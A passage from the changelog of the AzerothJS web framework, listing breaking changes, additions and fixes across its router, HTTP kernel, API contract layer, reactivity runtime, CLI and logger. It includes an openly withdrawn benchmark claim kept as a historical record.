  that loads). (4) `defineRoute(path, config)` TYPED HANDLES - pattern-inferred params
  (`.to({ id })` compile-checked), loader-typed `useLoader(handle)`, and a `search`
  schema whose validated+coerced value `useSearch(handle)` returns typed (an invalid
  query degrades to `{}` with one console warning, never a crash). (5) SSR handoff v2 -
  `matchAndLoad` pre-resolves lazy chunks and runs ALL levels' loaders in parallel;
  the wire payload is versioned and per-level, and a stale or older-shaped payload is
  rejected loudly in favor of a normal fetch.

### Changed

- **tooling** (BREAKING for direct importers only): `@azerothjs/language-service`
  folded INTO `@azerothjs/language-server` as the `./language-service` subpath - the
  safe half of the ruled tooling consolidation. It was the one tooling package nothing
  user-facing referenced by name (verified: templates and editors reference
  `@azerothjs/typescript-plugin` in tsconfigs, `@azerothjs/eslint-plugin` in eslint
  configs, and the `azeroth`/`azeroth-tsc` binaries - those four keep their names
  precisely because they ARE user-facing contracts). The typescript-plugin now
  declares its real dependency instead of relying on hoisting. Train: 14 packages.

- **http / api** (BREAKING): `@azerothjs/api` folded INTO `@azerothjs/http` as the
  `./api` subpath - the ruled backend consolidation. `import { defineContract, route,
  mountApi } from '@azerothjs/http/api'`; the browser half at
  `@azerothjs/http/api/client` (unchanged surface, new specifier). One package fewer
  in the train; the standalone `@azerothjs/api` will be deprecated on npm at the next
  publish. The purity welds extend to the new subpaths: `./api` is kernel-pure
  (contracts mount on edge runtimes) and `./api/client` provably never reaches
  server code.

- **router** (BREAKING, per the ratified router-v2 design): `Router.loader` (the single
  leaf resource) is replaced by per-level `Router.loaders` - `useLoader(router)` keeps
  the old "deepest loading level" meaning; `LoaderHandoff` is now
  `{ version, path, data: unknown[] }` (array by level); `Route.loader` receives
  `{ params, query, signal, parent }`; `router.navigationKind()` is DELETED - read
  `location().navigationKind`; `matchAndLoad` returns `MatchAndLoadResult` (handoff,
  `{ redirect }`, or null); router-written history entries WRAP user state
  (`history.state.state` carries what you passed to `navigate`); scroll and focus
  defaults change observable behavior (opt-outs: `scroll: false`, `focus: false`,
  per-navigation `scroll`).

- **http**: trusted-proxy URL truth. `serve(app, { trustProxy: true })` (granularly
  `{ proto: true }` / `{ host: true }`, also on `serveH2c` and `toWebRequest`) believes
  `X-Forwarded-Proto`/`X-Forwarded-Host` from a declared terminating proxy, so
  `context.url` carries the client's real scheme and host behind nginx/ALB/Cloudflare
  instead of the internal hop's `http://`. Off by default - the headers are
  caller-forgeable without a proxy (the same explicit trust boundary `clientIp` draws).
  The first entry of a comma-joined chain wins; a forwarded host is validated as
  host[:port] (no path or credential smuggling into the URL) and a forwarded proto
  only counts as `http`/`https`.
- **http**: `streamMultipart(request)` - the pull-based multipart iterator for uploads
  beyond memory. Parts arrive in posted order as they come off the socket; each payload
  is a `ReadableStream` piped straight to its sink (disk, object storage), with
  `bytes()`/`text()` per-part helpers (capped) for small parts. Same validation posture
  as the buffered reader: wrong content type is a 415, framing violations are typed
  400s, part-count and header caps hold, and parsing is chunk-edge safe (a boundary
  split across transport chunks parses byte-identically). Single-pass discipline:
  advancing the iterator discards the current part's unread remainder, and every exit -
  terminal delimiter, error, or an early `break` - releases the request body reader.
- **http**: static files answer single-range `Range` requests - a 206 streams exactly
  the requested span (video seeking, download resume), an unsatisfiable range is a 416
  with the total size, and multi-range or malformed headers are ignored with the full
  200 (RFC 9110 permits this; multipart/byteranges buys real clients nothing).
  `If-Range` holds by ETag or `Last-Modified` date, so a resumed download never splices
  two versions of a file; `Accept-Ranges` and `Last-Modified` now ride every response.
  `compressResponse` exempts 206s - a byte range refers to the UNENCODED representation.
- **api**: contract-level file routes. `input: multipart({ fields, limit, maxParts,
  maxFileSize })` declares a multipart/form-data route in the contract; the handler
  receives `{ fields, files }` fully typed - fields validated against the schema (the
  same 422 field map as JSON routes), files buffered within the caps. A non-multipart
  POST is a 415; the OpenAPI document declares the `multipart/form-data` request body
  with the fields schema. The typed client refuses multipart routes loudly (a browser
  posts `FormData` directly); beyond-memory uploads use `streamMultipart` in the handler.
- **api**: the typed reply channel. A route declares its non-default responses per
  status (`responses: { 201: User, 409: Problem }`) and a handler speaks them through
  `reply(status, body?, headers?)` - the body is validated against that status's
  schema exactly like `output` (a violation is the same hidden 500
  `contract-violation`), `reply(204)` sends an empty response, and an undeclared
  status with a body is a compile error. Every declared status becomes its own entry
  in the OpenAPI document with its real schema (a prose-only `docs.errors` entry can
  no longer downgrade it to the generic envelope). A raw `Response` return remains
  the only validation bypass - the non-JSON escape hatch (files, redirects, streams),
  now by documented design. The client keeps its success-body behavior.
- **compiler / azerothjs**: the compiled-output version handshake. Every compiled
  module now asserts the runtime-contract version it was built against
  (`assertRuntimeContract(N)`, once, at load) against the runtime's
  `RUNTIME_CONTRACT_VERSION`. A prebuilt artifact (a published `.azeroth` library's
  dist, a stale bundle) meeting a runtime from a different contract era fails at
  startup with a clear "rebuild with the matching compiler" error instead of
  undefined behavior - this is what lets the compiled-output contract evolve after
  1.0. The compiler's and runtime's versions are welded by a drift test.
- **schema / form / api**: Standard Schema v1 everywhere. Every `@azerothjs/schema`
  schema now carries the `~standard` property, so a house schema plugs into ANY
  Standard-Schema-aware consumer (form resolvers, tRPC, other frameworks) exactly like a
  Zod schema. In the other direction, `FormConfig.schema` and per-field `validate`
  entries accept any SYNCHRONOUS Standard Schema validator (Zod/Valibot/ArkType) beside
  the native one - a team keeps its existing schemas - and the typed client now
  pre-validates a foreign-schema input locally before the request leaves (mapping its
  issue paths to the same flat field map). An async foreign schema in the sync form
  pipeline is a loud configuration error, not a silent skip; foreign schemas still
  degrade to the permissive OpenAPI shape (only native schemas self-describe fully).
- **reactivity**: `onMount(fn)` - the sanctioned post-connection hook. Runs once, one
  microtask after the synchronous render (every insertion path is synchronous, so the
  DOM is connected by then), under the registering owner: effects it creates are owned,
  a returned cleanup runs on unmount, a scope disposed before the microtask never fires
  its callback, and SSR skips it entirely. Refs still fire at construction (documented) -
  capture the element there, do connected-time work in onMount.
- **reactivity**: the ownership tree is now first-class. `createRoot` builds an `Owner`
  node (disposers, parent link, context storage, captured error routing);
  `getOwner()`/`runWithOwner(owner, fn)` let async continuations create effects that
  are OWNED - disposed with their scope instead of leaking - with errors still routed
  to the boundary the owner was created in. `createContext`/`provideContext`/
  `useContext` add owner-tree dependency injection: provided values flow down the tree,
  nearer provides shadow outer ones, sibling scopes are isolated, and values are freed
  on dispose. This is the primitive that lets component libraries thread theming or a
  router without module-level singletons.

### Changed

- **reactivity**: every write is now GLITCH-FREE. A top-level setter runs inside an
  implicit flush: the change wave marks memos and queues affected effects first, then
  each affected effect runs exactly once on fully-settled state - still synchronously,
  before the setter returns. Previously a diamond (one signal feeding two memos read by
  one effect) fired the effect once per branch, the first time on mixed-generation
  state (one memo fresh, one stale). Diamond-shaped updates got ~40% faster (one effect
  run per write instead of two); the single-binding write path pays ~11% for the
  guarantee. `batch()` remains the tool for coalescing MULTIPLE writes into one run,
  and now returns its body's value.

### Changed (BREAKING - beta)

- **http**: the package split into a pure fetch-standard kernel and a Node half.
  `serve`/`serveH2c`/`handleShutdownSignals`/`toWebRequest`/`writeResponse`/
  `staticFiles`/`compressResponse` (and their types) moved to the new
  `@azerothjs/http/node` subpath; the `.` entry now carries ZERO `node:*` imports in
  its module graph (one sanctioned exception: the AsyncLocalStorage request-root seam,
  implemented by Bun, Deno, and workerd) - enforced by a static purity test. New
  `toFetchHandler(app)` bridges an App to any WinterCG fetch runtime (Cloudflare
  Workers, Deno Deploy, Bun.serve, Vercel Edge):
  `export default { fetch: toFetchHandler(app) }`. `WebHandler` now lives on the
  kernel side.

- **THE CONSOLIDATION**: `azerothjs` is now ONE REAL PACKAGE. The six frontend packages -
  `@azerothjs/reactivity`, `@azerothjs/component`, `@azerothjs/renderer`,
  `@azerothjs/server` (SSR), `@azerothjs/router`, `@azerothjs/form` - are DISCONTINUED
  and live inside `azerothjs` (they were exact-pin lockstep and compiled output always
  imported `azerothjs`, so the split was never real). Migration: `import { ... } from
  'azerothjs'` everywhere the scoped names were used - every public symbol is unchanged.
  The publish train shrinks to 16 packages; `@azerothjs/schema`, the backend stack, the
  compiler, and the tooling packages are untouched.

- **store**: the `@azerothjs/store` package is DISCONTINUED - `createStore` now lives in
  `@azerothjs/reactivity`, whose store-scope machinery it always built on (134 LOC split
  across two packages was a boundary, not a module). `import { createStore } from
  'azerothjs'` is unchanged; a direct `@azerothjs/store` import becomes
  `@azerothjs/reactivity`.

- **api**: ONE mount form. `implementContract` and the legacy
  `mountApi(implementation, { guards })` overload are REMOVED (with the
  `Implementation`/`HandlersOf`/`HandlerFor`/`ApiGuard`/`MountOptions` types) - the
  unified `mountApi(app, contract, { guards, handlers })` is the only way, and the only
  one whose guard additions type into handlers. Factories share the guards map via
  `HandlersWithGuards`.
- **http**: `App.plugin(fn)` folded into `register` - one plugin verb accepting both a
  named `AzerothPlugin` and a bare function transform. `createLogger` renamed
  `createMinimalLogger` (it collided with `@azerothjs/logger`'s `createLogger` with an
  incompatible `Logger` type). `EdgeMiddleware` renamed `HandlerWrapper` (it decorates a
  handler; it never was the context-middleware algebra). `use()`'s aliasing and
  short-circuit typing caveats are now documented on the method - prefer `with()` where
  exactness matters.
- **http/api**: the QUERY method surface (`app.query`, the `query()` route factory,
  `queryResult`, `acceptQuery`) is flagged `@experimental` - RFC 10008 is not yet
  deployed internet reality; the API is stable within 1.x but marked until the RFC is.

- **azerothjs / reactivity**: internal machinery left the public surface. Compiled
  `.azeroth` output now imports its runtime from the new `azerothjs/internal` subpath -
  the single compiled-output contract, welded to the compiler by a drift test - and the
  public entry no longer exports `tmpl`/`bindHole`/`bindContent`/`bindEvent`/`bindSlot`/
  `bindProps`/`setProp` (rebuild apps with the matching compiler). `@azerothjs/reactivity`
  moved its framework plumbing (`serializeChild`, `wrapContentsAnchored`, the hydration
  adoption protocol, `setStoreScopeResolver`, the `subscriberCount` test probe) to
  `@azerothjs/reactivity/internal`; the public entry keeps the user primitives plus
  `ssr`/`isSSRNode`/`escapeText`/`escapeAttr`. Internal subpaths are exempt from semver.

- **reactivity**: `setSSRMarkers`/`getSSRMarkers` are REMOVED. Hydration markers are no
  longer a mutable global - they ride the render window itself:
  `runInMode('string', fn, { markers: true })` (what `renderToString` does) vs
  `{ markers: false }` (`renderToStaticMarkup`). Marker state is now render-scoped and
  exception-safe by construction - a throwing render cannot leak marker state into the
  next request - and backing the render context with per-async-context storage later
  (streaming SSR) becomes a one-accessor change.

- **server**: `island()` no longer wraps the island in a `<span style="display:contents">` -
  the anchor attributes now ride on the island component's OWN root element, so an island
  is valid anywhere its root is (a `<tr>` island sits directly in a `<tbody>`) and
  direct-child selectors keep working. An island component must render a single element
  root (now enforced with a descriptive error). `hydrateIslands()` adopts the new form;
  pages server-rendered by an older version must be re-rendered.
- **reactivity**: `catchError` returns `T | undefined` instead of a silently-undefined `T` -
  the caught case is now visible to the type checker.

### Fixed

- **api**: the client substitutes path parameters at identifier boundaries - `:id` no
  longer corrupts a sibling parameter named `:ida`.
- **ws**: two `attachWebSockets` endpoints coexist on one server - a path-mismatched
  endpoint no longer destroys a sibling endpoint's handshake; an upgrade nobody claims
  still gets exactly one clean 404.
- **http**: SSE connections drop a client that falls `maxBufferedBytes` (default 1 MiB)
  behind instead of buffering unbounded - EventSource reconnects and resumes via
  `Last-Event-ID`; the cap is configurable per stream.
- **create-azeroth**: the fullstack template's demo now calls the `/api/healthz` route the
  server actually defines, and its Dockerfile installs from the root workspace context so
  `docker build` succeeds (a workspace member has no lockfile of its own). Both are now
  guarded by scaffold tests.
- **eslint-plugin**: the plugin/processor `meta.version` is read from the package manifest
  instead of a hard-coded string that had gone stale.
- Release engineering: version bumps are structured per file kind (anchored manifest
  edits with parse validation, anchored gradle edit, exact-string docs) with a post-bump
  guard that fails on any drifted version example - the corruption class that once
  rewrote a CONTRIBUTING example into nonsense.

## [1.0.0-beta.2] - 2026-07-24

The terminal-experience release: `azeroth dev` becomes a designed frame instead of a
pipe multiplexer, and the logger's developer face renders meaning instead of strings.

### Changed (BREAKING - beta, no back-compat shim by design)

- **api**: the unified typed mount. `mountApi(app, contract, { guards, handlers })` now
  types guard additions INTO each handler's context and CHECKS the guards-map keys
  against the contract tree. A guard built with the new `guard()` helper carries its
  additions (`guard((context) => ({ accountId }))`), and every handler it protects reads
  `context.accountId` with NO cast; a mis-typed guard key (`'accont.*'`) is a compile
  error, not a silently-unguarded route. The legacy
  `mountApi(app, implementContract(contract, handlers), { guards })` form is retained for
  separate construction (its handlers type without additions - guarded routes there use a
  knowing cast). `HandlerArgs` was already renamed `HandlerContext`; new exports:
  `guard`, `Guard`, `GuardKey`, `GuardMap`, `HandlersWithGuards`, `TypedMountOptions`.
- **api**: **bring your own validator**. `route({ input, query, output })` accepts any
  [Standard Schema](https://standardschema.dev) validator (Zod, Valibot, ArkType via the
  `~standard` property) in addition to native `@azerothjs/schema`. A foreign schema
  validates the boundary (422 with the same field-path errors); its OpenAPI entry
  degrades to the honest permissive shape (native schemas keep full self-description).
- **http/api**: every handler now takes ONE argument, the `context`, and returns the
  response - `(context) => Response`, replacing http's `(request, ctx)` and the
  contract handler's `({ params, input, query, request, context })` five-name
  destructure. The context carries `request` (the raw web-standard Request), `params`,
  `url`, and - on contract routes - the validated `input`/`query`; whatever middleware
  or a mount guard adds lands FLAT on the same object. This unifies the two handler
  shapes into one, matching the single-context model the current framework generation
  proved developers want, while keeping what nobody else has: responses enforced
  against their declared schema, and the typed client + OpenAPI derived from the same
  contract. Migration is mechanical: `(request, ctx)` → `(context)` with `request` →
  `context.request`; `({ input, context })` → `(context)` reading `context.input` and
  `(context as typeof context & Guarded)` for guard additions. `Middleware` and
  `ApiGuard` take the context too (`(context) => additions | Response | void`). The
  `HandlerArgs` type is renamed `HandlerContext`.

### Added

- **api**: OpenAPI 3.1 export - the contract's third exporter after the server mount
  and the typed client. `toOpenApi(contract, { info })` derives the complete document
  from the declaration (paths, params, bodies, response shapes, operation ids and tags
  from the contract tree, the framework's 422/415/500 envelope responses);
  `openapiPlugin` serves it - plus a docs page at `/docs` with two viewers:
  **Scalar via CDN shell (default)** for the best-in-class UI, and
  **`viewer: 'azeroth'`** - the house explorer, a fully self-contained page (inline
  styles/script, zero external requests, works offline) in the AzerothJS design
  language with REST-colored methods, verdict-colored statuses, schema trees, and a
  same-origin try-it panel (`docs: false` for spec-only);
  `uncontracted(app, contract)` reports coverage for
  partial adoption. Deterministic output (byte-identical builds - specs diff cleanly
  in CI), shared schema instances dedupe into named components, and every mapping rule
  is tested with honest degradations - a `.refine()` becomes a
  description note, never an invented constraint. Routes gain an optional display-only
  `docs` field (summary/tags/deprecated/errors/security) for what a machine cannot know.
- **schema**: schemas are now fully self-describing - `meta` carries the constraints
  the validator enforces (the same options object, one source of truth), true kinds
  and payloads for `literal`/`enumOf`/`record`/`union`, and each `.refine()`'s declared
  code. `boolean`/`array` options gained named types (`BooleanOptions`, `ArrayOptions`);
  `SchemaMeta` is exported for compile-from-declaration consumers.
- **http**: `jsonEncoder` reads the richer self-description - `record` gains a real
  fast path, `literal` compiles to a constant, `enum` encodes as a string; `union`
  stays on the byte-exact fallback.
- **cli**: the dev conductor's line discipline - fixed-width colored stream badges
  (one hue per app half, dim `│` gutter), blank lines swallowed, each tool's session
  chatter rewritten to house style with its information intact (tsc watch banners →
  `compiling...` / `✓ compiled clean` / `✖ N errors`; node --watch lifecycle →
  `↻ restarting` / `crashed`), vite's identity block folded into one composed
  `✓ Ready in ...` frame listing every half's URL, and a one-line farewell on Ctrl+C.
- **cli**: `azeroth dev --raw` - verbatim child output, no environment additions,
  for debugging the tools themselves.
- **cli**: capability propagation - children keep their colors and pretty log faces
  under the conductor's pipe (`FORCE_COLOR` tier + `AZEROTH_LOG=pretty`, forwarded
  only when the conductor itself is on a TTY and never overriding the user's own
  environment); a piped/CI conductor stays byte-clean end to end.
- **cli**: `check`/`build` gained dim step headings and a closing verdict line
  (`✓ all checks passed` / `✓ build complete`).
- **logger**: `prettySink({ hide })` - context fields a human should not re-read on
  every line (a constant `service`, a `requestId`) can be hidden from the pretty
  face only; NDJSON faces and files always keep every field.
- **logger**: semantic values on the pretty face - `http(s)://` URLs render in the
  brand ice-blue, `status` codes as verdicts (2xx green / 3xx cyan / 4xx yellow /
  5xx red), request methods in their REST colors.
- **logger**: request sentences - a record shaped like `logRequests` output renders
  as `GET /healthz → 200 · 0.48ms` instead of `key=value` scaffolding; incomplete
  shapes (or hiding any ingredient) fall back to ordinary pairs.

### Changed

- **cli**: the server half of a dev session now starts on tsc's first compile
  report instead of a file-existence heuristic - one compile, one boot, no doubled
  `listening` line; tsc watch runs `--pretty` (colored diagnostics under the pipe)
  and node runs `--watch-preserve-output` (a child must not reset the terminal).
- **cli**: the live dev view no longer echoes full child command lines - `--print`
  remains the transparency surface, `--raw` still echoes them.
- **cli**: `doctor` verdict marks joined the glyph vocabulary (`✓`/`✖`/`−` with
  ASCII fallbacks).
- **logger**: the pretty face's calm rules - seconds-only dim clock (sub-second
  precision lives in measured fields), bold messages, `info` drops its level word
  (the icon carries it) while warn/error keep theirs with level-tinted messages,
  field pairs hang off dim interpuncts, and the tautological `url=` label drops
  before a URL value. Display only: values are never altered.
- **logger**: quiet text renders as a real gray at 256/truecolor tiers instead of
  ANSI faint, which several Windows console hosts draw as plain - the dim/bold
  hierarchy now survives every terminal.
- **logger**: `supportsUnicode()` is true on every Windows console a supported Node
  can run in (the env-marker allowlist was obsolete), and `colorTier()` recognizes
  the JetBrains terminal and defaults a bare Windows TTY to truecolor.

### Fixed

- **cli**: the dev supervisor no longer loses child colors, prints doubled boot
  lines, or lets `node --watch` clear the terminal on restart.
- **logger**: `logRequests` documentation taught a silent-terminal configuration
  (`stream: fileStream(...)` with no tee); the README now shows the tee recipe.

## [1.0.0-beta.1] - 2026-07-24

The first 1.0 beta. The framework becomes a full stack with one entry point: a
scaffolder (`npm create azeroth`), a CLI that understands every project shape, an
error pipeline and middleware model apps can shape without forking, and a logger
that persists. Everything below rode through the production pass: every new package
hardened file by file, every gate green (2017 tests), all 23 packages publint-clean.

### Added

- `@azerothjs/logger`: log files. `fileStream(target)` is a buffered NDJSON writer -
  point it at a file to append forever, or at a folder for day-named files with
  size rotation and retention. Rotation is RENAME-FREE (a new name opens; the old file
  stops growing), the design that is correct on Windows where open files cannot be
  renamed. Lines batch in a bounded buffer and land on a size threshold, a flush
  interval, `flush()`/`close()`, and process exit; overflow and write failures DROP and
  are counted (one stderr notice + an in-band `log lines dropped` record on recovery) -
  logging never blocks the event loop and never breaks the app. `fileSink()` is the
  record-level form and `teeSink(...sinks)` fans out with per-sink throw isolation
  (pretty console + file is the canonical pair). Used as the logger's `stream`, the
  fused fast path is untouched: emit benchmarks are unchanged, and file throughput
  measured ~10x pino's default file destination (~6x its async mode, at a fraction of
  the memory) on the reference machine.

- `@azerothjs/cli`: the `azeroth` command line - `dev` (the fullstack conductor: compiler
  watch when decorators demand one, `node --watch` gated on the first emit, and vite, under
  one banner with prefixed output), `check` (every gate the project's shape demands),
  `build` (artifacts in dependency order; a native backend deliberately has none), `doctor`
  (a catalog of real-world failure diagnoses), and `info`. No config file - the project's
  shape (frontend / backend native-vs-built / fullstack) is detected from what already
  exists, and ambiguity fails loud with `--app`/`--server` to disambiguate. `--print` on any
  orchestrating command prints the exact child invocations and exits: children are always
  `node <absolute script>` from the project's own node_modules - never a shell, never a cmd
  shim - so there is nothing hidden and nothing to eject.
- `create-azeroth`: `npm create azeroth@latest` - the day-one path. Three templates
  (frontend / backend / fullstack), at most two questions, opinions in the templates
  instead (eslint with the azeroth rules, the `azeroth-tsc` gate, the CLI verbs as
  scripts, the vite proxy line in plain sight). The backend template has no build step;
  the fullstack template is `application/` + `server/` workspaces under one root where
  one `npm run dev` runs both halves.

- `@azerothjs/http`: `new App({ serializeError })` reshapes the error wire body so an app can
  speak its own envelope (`{ success, code, field, message }`, JSON:API, ...) without
  reimplementing the one error path. The hook returns a plain value to replace the body (the
  kernel keeps the error's status and mandated headers - a 405 `Allow`, a 429 `Retry-After`), a
  `Response` for full control, or `undefined` to keep the default `{ error: { code, message } }`.
  It applies uniformly to every error, route-miss 404s included; a throwing serializer falls back
  to the default shape, so the last-resort error path can never break.
- `@azerothjs/http`: `app.with(middleware)` opens a SCOPED registration view - the middleware runs
  only for the routes registered through the returned app, not globally like `use`. It shares the
  parent's route table, chains (`app.with(throttle).with(auth).get(...)`) with full context-type
  accumulation, and never mutates the parent (a later `app.use` does not reach into an already-opened
  fork). Removes the per-handler guard-call boilerplate when only some routes need auth/throttle.

## [0.9.0-beta.4] - 2026-07-21

### Added

- The backend stack is now published to npm: `@azerothjs/http` (web-standard
  HTTP kernel), `@azerothjs/ws` (RFC 6455 WebSockets), `@azerothjs/api`
  (contract-first, type-safe API layer), and `@azerothjs/cron` (zero-dependency
  scheduler). They were previously private and consumable only via vendored
  tarballs; a clean `npm install @azerothjs/http` now resolves.

## [0.9.0-beta.3] - 2026-07-20

### Added

- `azeroth/unsafe-narrow-in-show` lint rule: flags `guard()!.x` inside a
  `<Show when={ guard() }>` whose children read the guarded value a second time
  via non-null assertion instead of using the callback form. That second read is
  independent of the one `when` already checked and can observe `null` even
  while the branch is mounted - `!` is erased at compile time, so it gives no
  runtime protection. Surfaces through `eslint .`, the Vite build, and editor
  diagnostics alike, with no separate wiring (it lives in the shared markup
  lint pass all three already read from).

### Fixed

- Reactive DOM attribute bindings written as a function literal or a bare
  getter reference (`class={ () => ... }`, `class={ computeClass }`) now
  update correctly. Dependency analysis cannot see reactive reads hidden
  inside those forms, so they previously rendered once and silently stopped
  reacting.
- `<ErrorBoundary>` no longer crashes ("insertBefore: parameter 1 is not of
  type 'Node'") when `children`/`fallback` resolves to a thunk chain (a
  function returning a function) instead of an already-built node.
- The Vite dev server's incremental type checker no longer serves stale
  diagnostics after editing a plain `.ts` dependency mid-session - file
  watcher changes now invalidate the checker's cached snapshot instead of
  pinning to the first-seen copy for the rest of the session.
- Same-line whitespace between inline markup children (`{ label } <span>`) is
  preserved as a single space instead of being dropped, which previously
  fused neighboring inline content together.
- `<Transition>` now warns once when its target has `display: contents`
  (which generates no box, so transform/opacity never paint and
  `transitionend` never fires) instead of silently snapping at the timeout
  fallback with no explanation.
- The packaged VS Code extension ships with its icon again (a missing build
  step left it out).

## [0.9.0-beta.2] - 2026-07-19

### Fixed

- Renderer `bindContent` now resolves a `children` thunk to its node instead of
  stringifying the function, so a component handed a function-returning-node as
  its children renders correctly.

## [0.9.0-beta.1] - 2026-07-19

### Added

- Route transitions: `<Routes transition="page">` animates route swaps with
  `<Transition>`'s 6-class family - the outgoing route plays its leave (removal
  deferred until it completes) while the incoming enters alongside, so cross-fades
  and directional drifts are pure CSS. The function form receives
  `{ from, to, navigation }` and returns a name per swap (or null for instant),
  and the new `router.navigationKind()` reports what caused each change
  (`'push' | 'replace' | 'pop'`) - a back-navigation can animate differently
  than a forward one. Rapid navigation flushes still-leaving routes instantly.
- `<TransitionGroup>`: keyed list enter/leave animation - items play the enter
  family when their key joins and the leave family (removal deferred) when it
  departs. The primitive toast stacks and notification trays hand-roll today.
- Virtualization: `createVirtualizer` (headless, equality-guarded window memo -
  scrolling within the same window is a reactive non-event, closing the
  re-slice-per-scroll-frame trap) and `<VirtualList>` (the packaged vertical
  scroller: spacer, absolute row positioning, keyed reuse). Fixed row size and
  explicit viewport height in v1.
- [`@azerothjs/logger`](packages/logger), the framework's voice: one zero-dependency
  logger with two faces - colored, iconed developer output on a TTY and pino-class
  NDJSON in production - with child loggers whose bound context serializes once,
  free disabled levels (below-threshold methods ARE a no-op), field redaction that
  runs before any sink, Error serialization with the full `cause` chain, honest
  color rules (NO_COLOR/FORCE_COLOR/TTY), a browser console face, and
  `AZEROTH_LOG` environment control. Measured ahead of pino on every emit path and
  ~10x ahead of winston. It also ships the AzerothJS startup banner: `serve()` now
  announces the bound addresses and measured ready time on a dev terminal (silence
  it with `banner: false`; it is always silent piped or in production), the Vite
  dev server prints the same identity with the compiled component count, and
  `attachWebSockets` and the cron scheduler take a structural `logger` for
  lifecycle visibility (connections; job runs, overlap skips, failures) without
  either package gaining a dependency. The repository also carries the project
  mark (`assets/`) - now the VS Code extension icon AND the JetBrains plugin
  icon. The frontend runtime packages deliberately stay logger-free: hot-path
  browser code carries no logging weight.
- `jsonEncoder(schema)` in `@azerothjs/http`: compiles a response declaration (the same
  `@azerothjs/schema` combinators that validate request bodies) into a shape-specialized
  JSON serializer - key strings prebuilt, primitive fields quoted inline behind an
  escape guard, byte-identical output to `json(data)` for declared shapes, with
  JSON.stringify fallback for anything the declaration cannot describe. The
  declaration-driven twin of `readValidated`: one reads the boundary through the
  schema, the other writes it. Schema combinators now carry internal structural
  metadata to make this compile-from-declaration possible.
- Client-only builds: `azeroth({ ssr: false })` compiles every component without
  its SSR/hydration branch and substitutes a constant render mode, so the SSR
  machinery minifies out of the bundle entirely - the js-framework-benchmark app
  dropped from 24.0 kB to 16.1 kB (5.4 kB gzip). Leave the default on for any app
  that calls `renderToString`/`hydrate`.

### Changed

- `<Transition>` now CANCELS a mid-flight run when toggled instead of queueing:
  a half-entered sheet reverses from exactly where it is (same element, state
  preserved) - rapid open/close feels crisp instead of "finish, then reverse".
- Every class across the packages now keeps its internals in native `#` private
  fields instead of TypeScript's erased `private` keyword: internals are genuinely
  unreachable at runtime, so nothing internal can silently become load-bearing
  API. Code that reached into undocumented members via casts will now find them
  gone - they were never API.
- Compiled markup got materially faster, measured on
  [js-framework-benchmark](https://github.com/krausest/js-framework-benchmark)
  (keyed): CPU geometric mean went from 1.29x to 1.07x of hand-written vanilla
  DOM, ahead of React, Angular, and Vue and even with Solid and Ripple, with the
  field's best select-row, swap-rows, and first-paint numbers. The work behind it:
  - A text hole that is its element's only child (`<td>{ row.id }</td>`) compiles
    anchor-free: one text node driven in place, no comment-marker pair per hole.
  - A `<For>` row expression with no reactive reads (`{ row.id }`) binds once
    instead of carrying a per-row effect; reactivity is decided by expression
    shape, so getter calls (`{ row.label() }`) stay live.
  - Compiled event handlers on bubbling event types are now DELEGATED to one
    document-level listener per type (matching the documented template-path
    contract); non-bubbling types keep per-element listeners.
  - `<For>` clears and full replacements collapse to one bulk `textContent`
    write when the list spans its parent, and a two-row swap reconciles with two
    moves instead of a position map and LIS pass.
  - `destroyComponent` returns in constant time when no element anywhere holds a
    destroy hook - removing a thousand hook-free rows no longer walks each
    subtree.
  - Devtools registration records are only allocated while a devtools hook is
    attached, taking a per-signal/effect/root allocation off the hot paths.
  - A single `class:` toggle compiles to a bare conditional instead of an
    array/filter/join per evaluation.
- **WITHDRAWN - see the "Corrected (performance claims)" entry under [Unreleased].** The Fastify
  half of this claim does not reproduce: re-measured with this same methodology, `@azerothjs/http`
  is ~5% BEHIND Fastify on the five-scenario geomean, and was already ~2% behind before the
  security work. The Express/Koa/Nest half has not been re-measured. Left in place unedited below
  as the historical record of what was believed at this release.

- `@azerothjs/http` got faster on the wire, measured against Express, Koa, NestJS,
  and Fastify with autocannon (100 connections, interleaved same-machine A/B):
  ahead of Express/Koa/Nest on every scenario by wide margins, and ahead of
  Fastify on the five-scenario geometric mean (~4%) - winning JSON echo (+14%),
  param routes (+9%, via `jsonEncoder`), and 404 (+14%), behind only on
  hello-world (-9%) and a 5-deep middleware chain (-5%). Part of the hello gap is
  the per-request reactive root (request-isolated stores + guaranteed cleanup,
  which the others do not offer; measured at ~3%, opt out with
  `new App({ requestRoot: false })`). The work behind it:
  - Response bodies now travel as STRINGS all the way to the socket, where Node
    encodes natively during the write - no TextEncoder pass, no byte-array
    allocation per response; Content-Length comes from a native byte count.
    `PayloadResponse` encodes lazily for anything that genuinely reads bytes.
  - The per-route middleware chain runs SYNCHRONOUSLY while middlewares return
    plain values - no microtask hop per middleware per request; the first
    thenable result switches that request onto the promise path unchanged.
  - The request root stopped allocating per request: the dispatch closure and
    cleanup-error options are per-app now, and the cleanup registry only exists
    once a handler registers teardown.
  - Dispatch runs synchronously end to end for a handler that returns a plain
    Response - no promise machinery until something genuinely asynchronous
    (an async handler, or HEAD body cancellation) enters the path.
- `@azerothjs/ws` measured against the `ws` library and socket.io (echo, 1000-way
  broadcast, connection churn, 5000 idle connections): ahead of socket.io on every
  line, ahead of `ws` on single-connection echo and idle memory (-11%), even on
  the rest - no code changes needed.

## [0.8.0-beta.2] - 2026-07-17

### Changed

- `<Match when>` accepts any value and matches while it is truthy, exactly like
  `<Show when>` - `when={ phase() === 'connected' && activeConfig() }` no longer
  needs an explicit boolean coercion.
- CJS bundles (tsserver plugin, VS Code server) carry a real `import.meta.url`,
  anchoring native-TypeScript resolution at the installed bundle instead of the
  process working directory.
- Release flow retries the editor-lockfile sync while the npm registry catches up
  with a fresh publish, and runs it on resumed (`--no-bump`) releases too.

### Fixed

- Editor/CI type checking: a function literal passed to a factory prop
  (`<ErrorBoundary fallback={ (error, reset) => ... }>`) now takes its parameter
  types from the prop's declared signature instead of falling to implicit `any`
  under a strict tsconfig.
- Docs: `<For>`'s keyed row reuse - and how to keep row values live through
  getters - is now documented in the renderer README.

## [0.8.0-beta.1] - 2026-07-16

### Added

- The backend, published for the first time: [`@azerothjs/http`](packages/http)
  (zero-dependency, web-standard HTTP kernel - every request is a reactive root),
  [`@azerothjs/schema`](packages/schema) (validation whose TypeScript types are
  inferred from the declaration, shared by browser forms, the api client, and the
  server boundary), [`@azerothjs/api`](packages/api) (declare a contract once, get
  the server mount and a fully inferred client), [`@azerothjs/ws`](packages/ws)
  (RFC 6455 WebSocket server from scratch), and [`@azerothjs/cron`](packages/cron)
  (cron scheduling with honest timezone/DST semantics). Each stands alone; a
  backend-only service needs no frontend packages.
